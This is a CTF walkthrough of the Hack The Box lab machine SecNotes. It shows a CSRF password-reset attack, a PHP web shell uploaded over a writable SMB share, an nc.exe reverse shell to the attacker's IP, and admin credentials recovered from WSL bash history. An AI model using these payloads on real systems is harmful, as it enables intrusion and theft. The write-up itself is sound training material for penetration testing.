---
machine: SecNotes
platform: Hack The Box
category: Windows
difficulty: Medium
points: 30
tags: [csrf, smb-upload, php-webshell, wsl-bash-history]
date: 2026-04-15
status: retired
summary: "A Windows IIS box centred on a custom PHP notes application, exercising client-side request forgery against an authenticated action, credential discovery, and abuse of writable SMB shares for web-shell upload. Privilege escalation explores a Windows Subsystem for Linux install and the credential trails left behind in shell history."
---

## Enumeration

nmap scan:

```bash
──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ nmap 10.129.8.86 -p- -T4 -oN hostscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 15:23 -0400
Nmap scan report for 10.129.8.86
Host is up (0.037s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 117.82 seconds

──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ nmap 10.129.8.86 -p 80,445,8808 -sCV -oN fingerprinting
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 15:26 -0400
Nmap scan report for 10.129.8.86
Host is up (0.037s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h20m01s, deviation: 4h02m32s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-02T19:26:33
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2026-06-02T12:26:36-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.84 seconds

```

IIS Web server on port 80 and 8808 `Microsoft-IIS/10.0`

Port 80 defaults to `login.php` so we know it uses php.

I am going to fuzz the port 80 site with feroxbuster with `-x php`

I can make an account at `register.php` and sign into it.  We see a banner saying:

```text
Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)  
Please contact **tyler@secnotes.htb** using the contact link below with any questions.
```

So we can assume that our domain is secnotes.htb and we have a user tyler to keep an eye out for.

## Foothold

We notice that if we try moving the post parameters for change password to the url and perform a GET request, it goes through and we see `Password Updated`
`http://10.129.8.86/change_pass.php?password=aaaaaa&confirm_password=aaaaaaa&submit=submit` This means we can change the password from the url, if we got someone to click on this or execute it, that would change their password.

If we start a listener on port 80 and submit our ip as a link in the contact form, we see someone clicks our link and our listener picks up their traffic:

```bash
──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.15.78] from (UNKNOWN) [10.129.8.86] 51094
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.15.78
Connection: Keep-Alive
```

These two pieces suggest an XSRF attack or a "one click attack".  If we can make a URL which performs an action, like resetting a password, the user who clicks on it will execute it and we can control their password.

I submit my malicious URL: `http://10.129.8.86/change_pass.php?password=aaaaaa&confirm_password=aaaaaa&submit=submit` to Contact Us.  We can reasonably assume the user clicking these links is `tyler@secnotes.htb` from the banner we saw earlier.

Its been a little bit lets try logging into tyler or `tyler@secnotes.htb` with password `aaaaaa`

Surely enough, we can now log into tyler with `aaaaaa`

In his notes we see:

```text
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

This looks like a UNC to an smb share called new-site, with password `92g!mA8BGjOirkL%OG*&`

We can enumerate SMB with these creds:

```bash
┌──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ nxc smb 10.129.8.86 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
SMB         10.129.8.86     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.8.86     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
SMB         10.129.8.86     445    SECNOTES         [*] Enumerated shares
SMB         10.129.8.86     445    SECNOTES         Share           Permissions     Remark
SMB         10.129.8.86     445    SECNOTES         -----           -----------     ------
SMB         10.129.8.86     445    SECNOTES         ADMIN$                          Remote Admin
SMB         10.129.8.86     445    SECNOTES         C$                              Default share
SMB         10.129.8.86     445    SECNOTES         IPC$            READ            Remote IPC
SMB         10.129.8.86     445    SECNOTES         new-site        READ,WRITE     
```

Looking in new-site we see the default IIS image like the one we saw on port 8808 and nothing else.  We can write to this directory meaning we can write a php webshell in here for non-interactive command execution on behalf of the web server.

```bash
──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ echo '<?php system($_REQUEST['cmd']); ?>' > shell.php
┌──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ cat shell.php     
<?php system($_REQUEST['cmd']); ?>
```

```text
# ls
drw-rw-rw-          0  Tue Jun  2 16:18:09 2026 .
drw-rw-rw-          0  Tue Jun  2 16:18:09 2026 ..
-rw-rw-rw-        696  Thu Jun 21 16:15:36 2018 iisstart.htm
-rw-rw-rw-      98757  Thu Jun 21 16:15:38 2018 iisstart.png
-rw-rw-rw-         33  Tue Jun  2 16:18:10 2026 shell.php
```

```bash
──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ curl 'http://10.129.8.86:8808/shell.php?cmd=whoami'

secnotes\tyler
```

We can upgrade the shell by transferring nc.exe over to the share and using the webshell to call back to a listener for an interactive shell:

```bash
curl "http://10.129.8.86:8808/shell.php?cmd=nc.exe+-e+cmd.exe+10.10.15.78+443"

┌──(kali㉿kali)-[10.10.15.78]-[~/htb/secnotes]
└─$ rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.15.78] from (UNKNOWN) [10.129.8.86] 53071
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler
```

We have permissions to navigate to tyler's desktop to retrieve the user flag from here.

## Privilege Escalation

We can see as we look through the file system that theres wsl / ubuntu running on the system.  We can search for bash.exe to run the shell in wsl: `where /R c:\ bash.exe`

```cmd
C:\Distros\Ubuntu>where /R c:\ bash.exe
where /R c:\ bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

```cmd
C:\Distros\Ubuntu>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root
```

We can upgrade it to interactive pty with python `python -c 'import pty;pty.spawn("/bin/bash")'`

```bash
root@SECNOTES:~# whoami
whoami
root
root@SECNOTES:~# 
```

Looking around in the wsl filesystem we find a nonempty .bash_history file in the root home directory:

```bash
root@SECNOTES:~# ls -lah
ls -lah
total 8.0K
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3.1K Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exitroot@SECNOTES:~# 

```

Here we see an smb pair `administrator : u6!4ZwgwOM#^OBf#Nwnh`, we can however just copy paste this command to access the localhost smb share as admin and navigate to the Admin's desktop in the share for the root.txt flag, get it, and then read it in bash root.

Box complete!
